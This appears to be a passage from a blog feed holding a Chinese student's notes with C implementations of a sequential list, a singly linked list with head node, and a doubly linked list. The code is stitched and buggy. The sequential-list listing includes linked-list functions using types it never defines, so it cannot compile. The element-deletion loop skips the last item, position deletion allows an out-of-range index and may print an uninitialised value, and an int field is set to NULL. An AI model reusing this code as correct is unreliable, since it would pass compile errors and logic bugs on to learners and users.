    <url>/2021/08/08/CH1%20%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%8F%8A%E5%AE%9E%E7%8E%B0%EF%BC%88C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CH1 顺序表基本操作及实现（C）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#include&lt;stdio.h&gt;</span><br><span class="hljs-meta">#include&lt;stdlib.h&gt;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Elemtype int </span><br><br>typedef <span class="hljs-keyword">struct</span>&#123;<br>    Elemtype data[MAXSIZE];<br>    <span class="hljs-built_in">int</span> length;<br>&#125;Sqlist;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InitSqlist</span>(<span class="hljs-params">Sqlist *L</span>)</span><br>&#123;<br>    L-&gt;length=<span class="hljs-number">0</span>;<br>    printf(<span class="hljs-string">&quot;Init the list successfully!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CreateSqlist</span>(<span class="hljs-params">Sqlist *L,<span class="hljs-built_in">int</span> temp_data[],<span class="hljs-built_in">int</span> temp_length</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(temp_length&gt;MAXSIZE)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Overflow!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=<span class="hljs-number">0</span>;index&lt;temp_length;index++)<br>    &#123;<br>        L-&gt;data[index]=temp_data[index];<br>    &#125;<br>    L-&gt;length=temp_length;<br>    printf(<span class="hljs-string">&quot;Create the table successfully!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InsertList</span>(<span class="hljs-params">Sqlist *L,Elemtype newData,<span class="hljs-built_in">int</span> temp_position</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(temp_position&lt;<span class="hljs-number">0</span>||temp_position&gt;L-&gt;length+<span class="hljs-number">1</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Wrong position!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=L-&gt;length;index&gt;temp_position;index--)<br>        &#123;<br>            L-&gt;data[index]=L-&gt;data[index<span class="hljs-number">-1</span>];<br>        &#125;<br>        L-&gt;data[temp_position]=newData;<br>        printf(<span class="hljs-string">&quot;Add new data successfully!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DeleteDataByElement</span>(<span class="hljs-params">Sqlist *L,Elemtype deletedData</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> counter=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=<span class="hljs-number">0</span>;index&lt;L-&gt;length<span class="hljs-number">-1</span>;index++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(L-&gt;data[index]==deletedData)<br>        &#123;<br>            counter+=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index1=index;index1&lt;L-&gt;length<span class="hljs-number">-1</span>;index1++)<br>            &#123;<br>                L-&gt;data[index1]=L-&gt;data[index1+<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    L-&gt;length-=counter;<br>    printf(<span class="hljs-string">&quot;The counter is %d\n&quot;</span>,counter);<br>    printf(<span class="hljs-string">&quot;Delete the data successfully!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DeleteDataByPosition</span>(<span class="hljs-params">Sqlist *L,<span class="hljs-built_in">int</span> tempDeletePosition</span>)</span><br>&#123;<br>    Elemtype deleted_data;<br>    <span class="hljs-keyword">if</span>(tempDeletePosition&lt;<span class="hljs-number">0</span>||tempDeletePosition&gt;L-&gt;length)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Wrong position!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        deleted_data=L-&gt;data[tempDeletePosition];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=tempDeletePosition;index&lt;L-&gt;length;index++)<br>        &#123;<br><br>            L-&gt;data[index]=L-&gt;data[index+<span class="hljs-number">1</span>];<br>        &#125;<br>        L-&gt;length--;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;Delete the data successfully!\n&quot;</span>);<br>    printf(<span class="hljs-string">&quot;The deleted data is %d\n&quot;</span>,deleted_data);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//按值查找</span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">Locate_Data</span>(<span class="hljs-params">Linklist L,ElemType targetData</span>)</span><br>&#123;<br>    LNode *p;<br>    p=L-&gt;next;<br>    <span class="hljs-built_in">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(p)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p-&gt;data==targetData)<br>        &#123;<br>            printf(<span class="hljs-string">&quot;Position:%d.\n&quot;</span>,index);<br>            <span class="hljs-keyword">return</span> index;<br>        &#125;<br>        index++;<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;No such a data.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//计算链表长度</span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">CountLinklistLength</span>(<span class="hljs-params">Linklist L</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> count=<span class="hljs-number">0</span>;<br>    LNode *p;<br>    p=L-&gt;next;<br>    <span class="hljs-keyword">while</span>(p)<br>    &#123;<br>        count++;<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;List length : %d.\n&quot;</span>,count);<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintList</span>(<span class="hljs-params">Sqlist *L</span>)</span><br>&#123;<br>    printf(<span class="hljs-string">&quot;The list is below:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=<span class="hljs-number">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;%d &quot;</span>,L-&gt;data[index]);<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\nThe length is %d\n&quot;</span>,L-&gt;length);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//不确定是否正确</span><br><span class="hljs-comment">// void EmptyList(Sqlist *L)</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     free(L-&gt;data);</span><br><span class="hljs-comment">//     L-&gt;length=0;</span><br><span class="hljs-comment">//     return;</span><br><span class="hljs-comment">// &#125;</span><br><br><br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span>&#123;<br>    <span class="hljs-built_in">int</span> my_data[MAXSIZE]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">22</span>,<span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-built_in">int</span> my_length=<span class="hljs-number">10</span>;<br>    Sqlist my_list;<br>    Elemtype insertData=<span class="hljs-number">10</span>;<br>    <span class="hljs-built_in">int</span> my_new_position=<span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">int</span> my_abandoned_data=<span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">int</span> my_deleted_position=<span class="hljs-number">2</span>;<br><br>    InitSqlist(&amp;my_list);<br>    CreateSqlist(&amp;my_list,my_data,my_length);<br>    InsertList(&amp;my_list,insertData,my_new_position);<br>    PrintList(&amp;my_list);<br>    DeleteDataByElement(&amp;my_list,my_abandoned_data);<br>    DeleteDataByPosition(&amp;my_list,my_deleted_position);<br>    <span class="hljs-comment">// EmptyList(&amp;my_list);</span><br>    PrintList(&amp;my_list);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>统一使用头节点后的代码实现：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function">Linklist <span class="hljs-title">Create_Linklist</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> n</span>)</span><br>&#123;<br>    LNode *L,*p,*q;<br>    <span class="hljs-built_in">int</span> i;<br>    L=(LNode*)malloc(<span class="hljs-keyword">sizeof</span>(LNode));<br>    L-&gt;next=NULL;           <span class="hljs-comment">//Head node;</span><br>    q=L;                    <span class="hljs-comment">//q-&gt;L;</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        p=(LNode*)malloc(<span class="hljs-keyword">sizeof</span>(LNode));<br>        printf(<span class="hljs-string">&quot;Pelase enter data %d:&quot;</span>,i);<br>        scanf(<span class="hljs-string">&quot;%d&quot;</span>,&amp;p-&gt;data); <span class="hljs-comment">//q=L,p赋值</span><br>        p-&gt;next=NULL;<span class="hljs-comment">//q=L, p-&gt;NULL</span><br>        q-&gt;next=p;<span class="hljs-comment">//q-&gt;p-&gt;NULL==L-&gt;p-&gt;null;</span><br>        q=p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> L;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">InsertData</span>(<span class="hljs-params">Linklist L,ElemType data,<span class="hljs-built_in">int</span> pos</span>)</span><br>&#123;<br>    LNode *p,*s;<br>    <span class="hljs-built_in">int</span> index;<br>    p=L;<br>    index=<span class="hljs-number">-1</span>;<span class="hljs-comment">//index设置为-1，则从0开始计算链表长度</span><br>    <span class="hljs-keyword">while</span>(p&amp;&amp;index&lt;pos<span class="hljs-number">-1</span>)<span class="hljs-comment">//循环找到目标元素的前一个元素</span><br>    &#123;<br>        p=p-&gt;next;<br>        index++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!p||index&gt;pos<span class="hljs-number">-1</span>)<span class="hljs-comment">//p的下一个为空则不存在；index大于pos则出错；</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;Wrong position.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    s=(LNode*)malloc(<span class="hljs-keyword">sizeof</span>(LNode));<span class="hljs-comment">//创建新空间</span><br>    s-&gt;data=data;<br>    s-&gt;next=p-&gt;next;<span class="hljs-comment">//s=target</span><br>    p-&gt;next=s;<span class="hljs-comment">//p-&gt;s,s-&gt;target</span><br>    printf(<span class="hljs-string">&quot;Insert the data successfully.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">DeleteData</span>(<span class="hljs-params">Linklist L,ElemType *e,<span class="hljs-built_in">int</span> pos</span>)   <span class="hljs-comment">//*e可以获得目标元素的地址</span></span><br>&#123;<br>    LNode *p,*q;<br>    p=L-&gt;next;<br>    <span class="hljs-built_in">int</span> index=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(p-&gt;next&amp;&amp;index&lt;pos<span class="hljs-number">-1</span>)<br>    &#123;<br>        p=p-&gt;next;<br>        index++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(p-&gt;next)||index&gt;pos<span class="hljs-number">-1</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Wrong position.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    q=p-&gt;next;<br>    *e=q-&gt;data;<span class="hljs-comment">//将data传入e</span><br>    p-&gt;next=q-&gt;next;<br>    free(q);<br>    printf(<span class="hljs-string">&quot;Get the data: %d\n&quot;</span>,*e);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>&#125;<br><br><span class="hljs-comment">//合并两个有序链表，且合成的链表也是顺序的</span><br><span class="hljs-function">Linklist <span class="hljs-title">MergeLinklist</span>(<span class="hljs-params">Linklist A,Linklist B</span>)</span><br>&#123;<br>    LNode *pa,*pb,*pc,*C;<br>    pa=A-&gt;next;<br>    pb=B-&gt;next;<br>    C=pc=A;<span class="hljs-comment">//C=A</span><br>    <span class="hljs-keyword">while</span>(pa&amp;&amp;pb)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pa-&gt;data&lt;=pb-&gt;data)<br>        &#123;<br>            pc-&gt;next=pa;<span class="hljs-comment">//c-&gt;a1;</span><br>            pc=pa;<span class="hljs-comment">//c=a1;</span><br>            pa=pa-&gt;next;<span class="hljs-comment">//a1=a2</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            pc-&gt;next=pb;<br>            pc=pb;<br>            pb=pb-&gt;next;<br>        &#125;<br>    &#125;<br>    pc-&gt;next=pa?pa:pb;<br>    free(B);<br>    <span class="hljs-keyword">return</span> C;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintLinklist</span>(<span class="hljs-params">Linklist L</span>)</span><br>&#123;<br>    LNode *p;<br>    p=L-&gt;next;<br>    printf(<span class="hljs-string">&quot;DATA OUTPUT:&quot;</span>);<br>    <span class="hljs-keyword">while</span>(p)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;%d &quot;</span>,p-&gt;data);<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span><br>&#123;<br>    <span class="hljs-built_in">int</span> e;<br><br>    Linklist MyLinklist;<br>    MyLinklist=Create_Linklist(<span class="hljs-number">5</span>);<br>    PrintLinklist(MyLinklist);<br>    InsertData(MyLinklist,<span class="hljs-number">101</span>,<span class="hljs-number">3</span>);<br>    PrintLinklist(MyLinklist);<br>    DeleteData(MyLinklist,&amp;e,<span class="hljs-number">3</span>);    <span class="hljs-comment">//Use &amp; to get data;</span><br>    PrintLinklist(MyLinklist);<br><br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>二、双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Elemtype;<br><br><span class="hljs-comment">//节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DulNode</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DulNode</span> * <span class="hljs-title">prior</span>;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DulNode</span> * <span class="hljs-title">next</span>;</span><br>&#125;DulNode,*DulLinkList;<br><br>DulNode* <span class="hljs-title function_">initDulNode</span><span class="hljs-params">(DulNode * L,<span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-comment">//创建一个首元节点，链表的头指针为L</span><br>    L=(DulNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(DulNode));<br>    <span class="hljs-comment">//对节点进行初始化</span><br>    L-&gt;prior=<span class="hljs-literal">NULL</span>;<br>    L-&gt;next=<span class="hljs-literal">NULL</span>;<br>    L-&gt;data=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//声明一个指向首元节点的指针，方便后期向链表中添加新创建的节点</span><br>    DulNode *r=L;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count=<span class="hljs-number">0</span>; count&lt;length; count++) &#123;<br>        <span class="hljs-comment">//创建新的节点并初始化</span><br>        DulNode *p=(DulNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(DulNode));<br>        p-&gt;prior=<span class="hljs-literal">NULL</span>;<br>        p-&gt;next=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter data %d:&quot;</span>,count);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;p-&gt;data);<br>        <span class="hljs-comment">//新节点与链表最后一个节点建立关系</span><br>        r-&gt;next=p;<br>        p-&gt;prior=r;<br>        <span class="hljs-comment">//r永远指向链表中最后一个节点，重点！！！！</span><br>        r=r-&gt;next;<br>    &#125;<br>    <span class="hljs-comment">//返回新创建的链表</span><br>    <span class="hljs-keyword">return</span> L;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">(DulNode * L)</span>&#123;<br>    DulNode *temp=L-&gt;next;<br>    <span class="hljs-keyword">while</span> (temp) &#123;<br>        <span class="hljs-comment">//如果该节点无后继节点，说明此节点是链表的最后一个节点</span><br>        <span class="hljs-keyword">if</span> (temp-&gt;next==<span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,temp-&gt;data);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &lt;-&gt; &quot;</span>,temp-&gt;data);<br>        &#125;<br>        temp=temp-&gt;next;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//创建一个头指针</span><br>    DulNode * L=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//调用链表创建函数</span><br>    L=initDulNode(L,<span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//输出创建好的链表</span><br>    display(L);<br>    <span class="hljs-comment">//显示双链表的优点</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于C语言的一些奇奇怪怪</title>
    <link href="/2021/08/08/C%E8%AF%AD%E8%A8%80-%E9%A1%BA%E5%BA%8F%E8%A1%A8/"/>
    <url>/2021/08/08/C%E8%AF%AD%E8%A8%80-%E9%A1%BA%E5%BA%8F%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 